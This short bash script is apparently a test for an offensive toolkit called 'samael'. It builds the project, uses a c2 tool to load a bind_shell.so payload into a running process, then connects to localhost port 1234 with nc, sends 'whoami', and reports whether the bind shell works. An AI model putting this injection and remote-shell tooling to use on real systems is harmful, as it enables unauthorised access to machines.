#!/bin/bash
user=$(whoami) > /dev/null
killall test 2> /dev/null

if [ ${PWD##*/} == "tests" ]
then
    cd ../
fi

cd ../
make clean > /dev/null
make $1 > /dev/null
cd src/
./samael > /dev/null
./test > /dev/null
../tools/c2/c2 ../payloads/bind_shell.so
output=$((echo -e "whoami\n" | nc -q 1 localhost 1234) 2> /dev/null)
if [ "$output" != "$user" ]
then
    echo "[X] Bind Shell Test Failed"
else
    echo "[*] Bind Shell Test Passed"
fi
